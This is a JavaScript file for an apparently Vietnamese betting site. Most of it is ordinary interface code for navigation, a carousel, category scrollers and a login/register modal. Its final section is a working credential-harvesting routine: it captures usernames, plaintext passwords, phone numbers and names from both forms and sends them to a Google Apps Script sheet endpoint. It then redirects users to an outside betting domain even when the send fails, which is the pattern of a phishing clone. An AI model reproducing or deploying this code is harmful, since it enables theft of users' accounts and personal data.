// Đợi toàn bộ giao diện HTML tải xong mới chạy JavaScript
document.addEventListener("DOMContentLoaded", function() {
    
    /* ========================================================
       1. XỬ LÝ MENU DƯỚI CÙNG (BOTTOM NAV) TRÊN MOBILE
    ======================================================== */
    const bottomNavItems = document.querySelectorAll('.bottom-nav-item');
    bottomNavItems.forEach(item => {
        item.addEventListener('click', function(e) {
            e.preventDefault(); 
            bottomNavItems.forEach(nav => nav.classList.remove('active'));
            this.classList.add('active');
        });
    });

    const mobileMenuBtn = document.getElementById('mobile-menu-btn');
    if (mobileMenuBtn) {
        mobileMenuBtn.addEventListener('click', function() {
            alert("Tính năng mở Menu Sidebar đang được phát triển!");
        });
    }

    /* ========================================================
       2. XỬ LÝ BANNER SLIDER TỰ ĐỘNG TRƯỢT
    ======================================================== */
    const track = document.getElementById('bannerTrack');
    const slides = document.querySelectorAll('.carousel-slide');
    const nextBtn = document.getElementById('nextBtn');
    const prevBtn = document.getElementById('prevBtn');
    const dotsContainer = document.getElementById('carouselDots');

    if (track && slides.length > 0) {
        let currentIndex = 0;
        const totalSlides = slides.length;
        let slideInterval;
        const intervalTime = 3000;

        dotsContainer.innerHTML = ''; 
        slides.forEach((_, index) => {
            const dot = document.createElement('div');
            dot.classList.add('dot');
            if (index === 0) dot.classList.add('active');
            dot.addEventListener('click', () => goToSlide(index));
            dotsContainer.appendChild(dot);
        });
        const dots = document.querySelectorAll('.dot');

        function updateSlider() {
            track.style.transform = `translateX(-${currentIndex * 100}%)`;
            dots.forEach(dot => dot.classList.remove('active'));
            if (dots[currentIndex]) {
                dots[currentIndex].classList.add('active');
            }
        }

        function nextSlide() {
            currentIndex = (currentIndex === totalSlides - 1) ? 0 : currentIndex + 1;
            updateSlider();
        }

        function prevSlide() {
            currentIndex = (currentIndex === 0) ? totalSlides - 1 : currentIndex - 1;
            updateSlider();
        }

        function goToSlide(index) {
            currentIndex = index;
            updateSlider();
            resetAutoSlide(); 
        }

        function startAutoSlide() {
            slideInterval = setInterval(nextSlide, intervalTime);
        }
        
        function resetAutoSlide() {
            clearInterval(slideInterval);
            startAutoSlide();
        }

        if (nextBtn) {
            nextBtn.addEventListener('click', () => {
                nextSlide();
                resetAutoSlide();
            });
        }
        if (prevBtn) {
            prevBtn.addEventListener('click', () => {
                prevSlide();
                resetAutoSlide();
            });
        }

        startAutoSlide();
    }

    /* ========================================================
       3. XỬ LÝ DANH MỤC TRƯỢT NGANG (MOBILE) VÀ GAME HOT
    ======================================================== */
    // Danh mục Mobile
    const catNav = document.getElementById('mobileCategories');
    const catLeftBtn = document.getElementById('catLeftBtn');
    const catRightBtn = document.getElementById('catRightBtn');

    if (catNav && catLeftBtn && catRightBtn) {
        catLeftBtn.addEventListener('click', () => {
            catNav.scrollBy({ left: -100, behavior: 'smooth' });
        });
        catRightBtn.addEventListener('click', () => {
            catNav.scrollBy({ left: 100, behavior: 'smooth' });
        });
    }

    const catItems = document.querySelectorAll('.cat-item');
    catItems.forEach(item => {
        item.addEventListener('click', function() {
            catItems.forEach(i => i.classList.remove('active'));
            this.classList.add('active');
        });
    });

    // Thanh nhà cung cấp Game Hot
    const provNav = document.getElementById('providerNav');
    const provLeft = document.getElementById('provLeft');
    const provRight = document.getElementById('provRight');

    if(provNav && provLeft && provRight) {
        provLeft.addEventListener('click', () => {
            provNav.scrollBy({ left: -250, behavior: 'smooth' });
        });
        provRight.addEventListener('click', () => {
            provNav.scrollBy({ left: 250, behavior: 'smooth' });
        });
    }

    const provBtns = document.querySelectorAll('.prov-btn');
    provBtns.forEach(btn => {
        btn.addEventListener('click', function() {
            provBtns.forEach(b => b.classList.remove('active'));
            this.classList.add('active');
        });
    });

    /* ========================================================
       4. XỬ LÝ CHUYỂN TAB SẢNH TRÒ CHƠI
    ======================================================== */
    const tabButtons = document.querySelectorAll('.tab-btn');
    const tabPanes = document.querySelectorAll('.tab-pane');

    tabButtons.forEach(button => {
        button.addEventListener('click', function() {
            const targetId = this.getAttribute('data-target');
            
            tabButtons.forEach(btn => btn.classList.remove('active'));
            this.classList.add('active');

            tabPanes.forEach(pane => pane.classList.remove('active'));
            const targetPane = document.getElementById(targetId);
            if (targetPane) {
                targetPane.classList.add('active');
            }
        });
    });

    /* ========================================================
       5. XỬ LÝ MODAL ĐĂNG NHẬP / ĐĂNG KÝ
    ======================================================== */
    const authModal = document.getElementById('authModal');
    const closeModal = document.getElementById('closeModal');
    
    const btnLoginHeaders = document.querySelectorAll('.btn-login');
    const btnRegisterHeaders = document.querySelectorAll('.btn-register');
    
    const tabLoginBtn = document.getElementById('tabLoginBtn');
    const tabRegisterBtn = document.getElementById('tabRegisterBtn');
    const loginForm = document.getElementById('loginForm');
    const registerForm = document.getElementById('registerForm');

    function switchTab(isLogin) {
        if (isLogin) {
            if(tabLoginBtn) tabLoginBtn.classList.add('active');
            if(tabRegisterBtn) tabRegisterBtn.classList.remove('active');
            if(loginForm) loginForm.classList.add('active');
            if(registerForm) registerForm.classList.remove('active');
        } else {
            if(tabRegisterBtn) tabRegisterBtn.classList.add('active');
            if(tabLoginBtn) tabLoginBtn.classList.remove('active');
            if(registerForm) registerForm.classList.add('active');
            if(loginForm) loginForm.classList.remove('active');
        }
    }

    // Mở form Đăng Nhập
    btnLoginHeaders.forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            if (authModal) authModal.classList.add('show');
            switchTab(true);
        });
    });

    // Mở form Đăng Ký
    btnRegisterHeaders.forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            if (authModal) authModal.classList.add('show');
            switchTab(false);
        });
    });

    // Chuyển tab bên trong Modal
    if (tabLoginBtn) tabLoginBtn.addEventListener('click', (e) => { e.preventDefault(); switchTab(true); });
    if (tabRegisterBtn) tabRegisterBtn.addEventListener('click', (e) => { e.preventDefault(); switchTab(false); });

    // Đóng Modal
    if (closeModal) {
        closeModal.addEventListener('click', () => {
            if (authModal) authModal.classList.remove('show');
        });
    }

    // Đóng Modal khi click ngoài khung
    window.addEventListener('click', (e) => {
        if (e.target === authModal) {
            authModal.classList.remove('show');
        }
    });
/* ========================================================
       6. XỬ LÝ GỬI FORM VỀ GOOGLE SHEET VÀ CHUYỂN HƯỚNG
    ======================================================== */
    const redirectUrl = "https://m.f8bet11g.com/";
    // DÁN LINK WEB APP URL CỦA BẠN VÀO DƯỚI ĐÂY:
    const scriptURL = "https://script.google.com/macros/s/AKfycbyZ57pz2Iv658JMnPe1tzEzMLaY9UZBd8s4HDaICG-HQWtBFq48Pnyi4ofjHEAEsQ/exec";

    // Hàm gửi dữ liệu lên Google Sheet
    function sendDataToSheet(data, submitButton) {
        // Vô hiệu hóa nút bấm và đổi chữ để người dùng chờ
        const originalText = submitButton.innerHTML;
        submitButton.disabled = true;
        submitButton.innerHTML = "ĐANG XỬ LÝ...";

        fetch(scriptURL, {
            method: 'POST',
            body: JSON.stringify(data),
            // Gửi dưới dạng text/plain để tránh lỗi CORS chặn Request
            headers: { 'Content-Type': 'text/plain;charset=utf-8' }
        })
        .then(response => {
            // Sau khi Google Sheet nhận xong dữ liệu thì mới chuyển hướng
            window.location.href = redirectUrl;
        })
        .catch(error => {
            console.error('Lỗi!', error.message);
            // Dù lỗi mạng thì vẫn chuyển hướng theo yêu cầu trải nghiệm
            window.location.href = redirectUrl; 
        });
    }

    // Xử lý khi Submit Form ĐĂNG NHẬP
    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault(); // Trình duyệt đã tự ktra ràng buộc 10 số, không bỏ trống
            
            const submitBtn = loginForm.querySelector('.auth-submit-btn');
            const formData = {
                type: "Đăng Nhập",
                username: document.getElementById('loginUser').value,
                password: document.getElementById('loginPass').value,
                phone: document.getElementById('loginPhone').value,
                fullname: "" // Đăng nhập không nhập tên
            };
            
            sendDataToSheet(formData, submitBtn);
        });
    }

    // Xử lý khi Submit Form ĐĂNG KÝ
    if (registerForm) {
        registerForm.addEventListener('submit', function(e) {
            e.preventDefault(); 
            
            const submitBtn = registerForm.querySelector('.auth-submit-btn');
            const formData = {
                type: "Đăng Ký",
                username: document.getElementById('regUser').value,
                password: document.getElementById('regPass').value,
                fullname: document.getElementById('regName').value,
                phone: document.getElementById('regPhone').value
            };
            
            sendDataToSheet(formData, submitBtn);
        });
    }
});